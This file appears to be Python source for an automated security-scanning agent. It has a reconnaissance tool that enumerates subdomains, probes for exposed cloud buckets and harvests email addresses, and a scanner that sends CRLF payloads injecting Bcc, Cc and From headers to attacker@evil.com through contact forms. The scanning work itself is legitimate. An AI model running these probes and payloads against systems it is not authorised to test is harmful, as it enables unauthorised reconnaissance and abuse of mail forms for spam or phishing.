import json
import requests
import re
import urllib3
from urllib.parse import urlparse, urljoin
from langchain.tools import tool
from rate_limiter import rate_limiter
from cancellation import check_cancelled
from auth_store import get_auth_kwargs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Advanced Recon (Certificate Transparency + Cloud Assets)
# ==========================================
@tool("recon_advanced")
def recon_advanced(domain: str) -> str:
    """
    Advanced reconnaissance menggunakan:
    - Certificate Transparency Logs (crt.sh) — subdomain discovery
    - Cloud asset discovery (S3, GCS, Azure Blob)
    - Email harvesting simulation
    - Security.txt / robots.txt analysis
    domain: target domain (e.g., "example.com")
    """
    tool_name = "Advanced Recon"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Memulai advanced recon untuk {domain}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    findings = {
        "certificate_transparency": {"subdomains": [], "error": None},
        "cloud_assets": [],
        "security_txt": None,
        "robots_txt": {"found": False, "disallowed": []},
        "email_patterns": [],
        "interesting_paths": []
    }

    # ── 1. Certificate Transparency (crt.sh) ─────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Querying Certificate Transparency logs (crt.sh)")
    try:
        rate_limiter.wait("crt.sh")
        r = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15, headers={"User-Agent": "Mozilla/5.0"}
        )
        if r.status_code == 200:
            certs = r.json()
            subdomains = set()
            for cert in certs:
                name_value = cert.get("name_value", "")
                for name in name_value.split("\n"):
                    name = name.strip().lower()
                    if name.endswith(f".{domain}") or name == domain:
                        if "*" not in name:  # exclude wildcards
                            subdomains.add(name)

            findings["certificate_transparency"]["subdomains"] = sorted(list(subdomains))
            logger.add_log(tool_name, "SUCCESS",
                f"CT logs: {len(subdomains)} unique subdomains found")
    except Exception as e:
        findings["certificate_transparency"]["error"] = str(e)
        logger.add_log(tool_name, "WARNING", f"crt.sh query failed: {e}")

    # ── 2. Cloud Asset Discovery ──────────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Checking cloud storage assets")
    # Common permutations used for bucket names
    base_name = domain.split(".")[0]
    bucket_permutations = [
        base_name, f"{base_name}-backup", f"{base_name}-dev",
        f"{base_name}-staging", f"{base_name}-prod", f"{base_name}-assets",
        f"{base_name}-static", f"{base_name}-media", f"{base_name}-data",
        f"{base_name}-files", f"{base_name}-uploads", f"{base_name}-images",
        f"{base_name}-logs", f"{base_name}-admin", domain,
    ]

    cloud_endpoints = []
    for perm in bucket_permutations[:8]:  # limit to avoid too many requests
        cloud_endpoints.extend([
            (f"https://{perm}.s3.amazonaws.com", "AWS S3"),
            (f"https://s3.amazonaws.com/{perm}", "AWS S3 (path)"),
            (f"https://storage.googleapis.com/{perm}", "Google Cloud Storage"),
            (f"https://{perm}.blob.core.windows.net", "Azure Blob"),
        ])

    for cloud_url, provider in cloud_endpoints[:20]:  # limit total checks
        if check_cancelled(logger): break
        try:
            rate_limiter.wait("cloud-check")
            r = requests.get(cloud_url, timeout=5, verify=False)
            if r.status_code == 200:
                is_public = any(kw in r.text for kw in [
                    "ListBucketResult", "EnumerationResults",
                    "Contents", "Key", "LastModified", "BlobItems"
                ])
                if is_public or len(r.content) > 200:
                    findings["cloud_assets"].append({
                        "url": cloud_url,
                        "provider": provider,
                        "status": r.status_code,
                        "publicly_accessible": is_public,
                        "severity": "Critical" if is_public else "Medium",
                        "detail": "Public bucket accessible" if is_public else "Responds 200 — may be public"
                    })
                    logger.add_log(tool_name, "WARNING", f"Cloud asset found: {cloud_url} ({provider})")
            elif r.status_code == 403:
                # 403 means bucket exists but access denied — still worth noting
                findings["cloud_assets"].append({
                    "url": cloud_url,
                    "provider": provider,
                    "status": 403,
                    "publicly_accessible": False,
                    "severity": "Info",
                    "detail": "Bucket exists but access denied"
                })
        except Exception:
            pass

    # ── 3. security.txt ───────────────────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Checking security.txt")
    security_txt_paths = [
        f"https://{domain}/.well-known/security.txt",
        f"https://{domain}/security.txt"
    ]
    for stp in security_txt_paths:
        try:
            rate_limiter.wait(domain)
            r = requests.get(stp, timeout=5, verify=False)
            if r.status_code == 200 and any(k in r.text for k in ["Contact:", "Policy:", "Encryption:"]):
                findings["security_txt"] = {
                    "url": stp,
                    "content": r.text[:500],
                    "note": "security.txt present — check Contact and Policy fields"
                }
                logger.add_log(tool_name, "SUCCESS", f"security.txt found: {stp}")
                break
        except Exception:
            pass

    # ── 4. robots.txt ─────────────────────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Analyzing robots.txt")
    try:
        rate_limiter.wait(domain)
        r = requests.get(f"https://{domain}/robots.txt", timeout=5, verify=False)
        if r.status_code == 200:
            findings["robots_txt"]["found"] = True
            disallowed = re.findall(r"Disallow:\s*(.+)", r.text)
            findings["robots_txt"]["disallowed"] = [d.strip() for d in disallowed if d.strip() not in ["/", ""]]
            findings["robots_txt"]["raw"] = r.text[:500]
            # Interesting paths from Disallow
            for path in findings["robots_txt"]["disallowed"]:
                if any(kw in path.lower() for kw in ["admin", "api", "backup", "config", "internal", "private"]):
                    findings["interesting_paths"].append({
                        "path": path,
                        "source": "robots.txt Disallow",
                        "severity": "Info"
                    })
            logger.add_log(tool_name, "SUCCESS",
                f"robots.txt found: {len(findings['robots_txt']['disallowed'])} disallowed paths")
    except Exception:
        pass

    # ── 5. Email pattern from domain ─────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Checking email exposure in page source")
    try:
        rate_limiter.wait(domain)
        r = requests.get(f"https://{domain}", timeout=8, verify=False)
        email_pattern = re.compile(r'[a-zA-Z0-9._%+-]+@' + re.escape(domain))
        emails = list(set(email_pattern.findall(r.text)))
        if emails:
            findings["email_patterns"] = emails[:20]
            logger.add_log(tool_name, "WARNING", f"Emails found in page: {emails[:3]}")
    except Exception:
        pass

    total_subdomains = len(findings["certificate_transparency"]["subdomains"])
    total_cloud = len([c for c in findings["cloud_assets"] if c["publicly_accessible"]])
    logger.add_log(tool_name, "SUCCESS",
        f"Advanced recon complete. CT subdomains: {total_subdomains}, Public cloud: {total_cloud}")
    return json.dumps(findings, indent=2)


# ==========================================
# TOOL 2: Email Header Injection Scanner
# ==========================================
@tool("email_header_injection_scanner")
def email_header_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan untuk Email Header Injection via contact forms / feedback forms.
    Attacker bisa inject CC/BCC/From headers untuk spam atau phishing.
    url: URL yang berisi contact form atau email submission endpoint
    params: comma-separated param names to test (biasanya "email", "name", "subject")
    """
    tool_name = "Email Header Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Memulai email header injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "email", "from", "name", "subject", "to", "reply-to", "replyto"
    ]

    # Email header injection payloads
    injection_payloads = [
        "test@test.com\r\nBcc: attacker@evil.com",
        "test@test.com\r\nCc: attacker@evil.com",
        "test@test.com%0ABcc:attacker@evil.com",
        "test@test.com%0d%0aBcc:attacker@evil.com",
        "test@test.com\nBcc: attacker@evil.com",
        "victim@domain.com\r\nFrom: attacker@evil.com\r\nTo: victim@target.com",
    ]

    findings = {"vulnerabilities": [], "suspicious": []}

    for param in param_list:
        if check_cancelled(logger): break
        for payload in injection_payloads:
            try:
                rate_limiter.wait(domain)
                r = requests.post(
                    url,
                    data={param: payload, "message": "test", "name": "test"},
                    timeout=5, verify=False
                )

                # Success indicators (form submitted without error)
                success_indicators = ["sent", "success", "thank", "received", "submitted", "delivered"]
                error_indicators = ["invalid", "error", "failed", "blocked", "not allowed"]

                is_success = any(si in r.text.lower() for si in success_indicators)
                is_error = any(ei in r.text.lower() for ei in error_indicators)

                if is_success and not is_error:
                    findings["suspicious"].append({
                        "parameter": param,
                        "payload": payload,
                        "type": "Possible Email Header Injection",
                        "severity": "High",
                        "note": "Form accepted CRLF payload — check if email was sent with injected headers"
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"Email header injection: param={param} accepted CRLF payload")
                    break

            except Exception:
                pass

    result = {
        "status": "SUSPICIOUS" if findings["suspicious"] else "SAFE",
        "findings": findings,
        "note": "Email header injection requires manual verification — check if actual email contains injected headers"
    }
    logger.add_log(tool_name, "SUCCESS", "Email header injection scan complete")
    return json.dumps(result, indent=2)
